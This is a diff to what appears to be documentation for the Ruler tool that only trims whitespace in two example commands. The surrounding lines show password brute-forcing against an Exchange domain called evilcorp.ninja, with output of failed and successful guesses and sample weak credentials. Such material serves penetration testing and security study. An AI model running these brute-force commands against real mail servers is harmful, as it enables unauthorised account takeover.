@@ -130,7 +130,7 @@ If you go the brute-force route, Ruler is your friend. It has a built-in brute-f
 You should see your brute-force in action:
 
 ```
-./ruler --domain evilcorp.ninja --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0  --verbose
+./ruler --domain evilcorp.ninja --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --verbose
 
 [*] Starting bruteforce
 [x] Failed: cindy.baker:P@ssw0rd
@@ -163,7 +163,7 @@ john.ford:August2016
 henry.hammond:Password!2016
 cindy.baker:Password1
 
-./ruler --domain evilcorp.ninja --insecure brute --userpass userpass.txt -v 
+./ruler --domain evilcorp.ninja --insecure brute --userpass userpass.txt -v
 
 [*] Starting bruteforce
 [+] Success: john.ford:August2016
